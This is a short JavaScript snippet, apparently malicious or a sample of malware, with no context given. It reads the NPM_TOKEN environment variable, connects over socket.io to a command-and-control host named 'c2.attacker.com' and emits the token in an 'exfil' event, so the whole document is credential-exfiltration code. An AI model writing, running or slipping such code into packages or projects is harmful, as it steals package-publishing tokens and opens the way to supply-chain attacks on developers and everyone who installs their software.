const io = require('socket.io-client');
const secret = process.env.NPM_TOKEN;
const socket = io('https://c2.attacker.com');
socket.emit('exfil', secret);
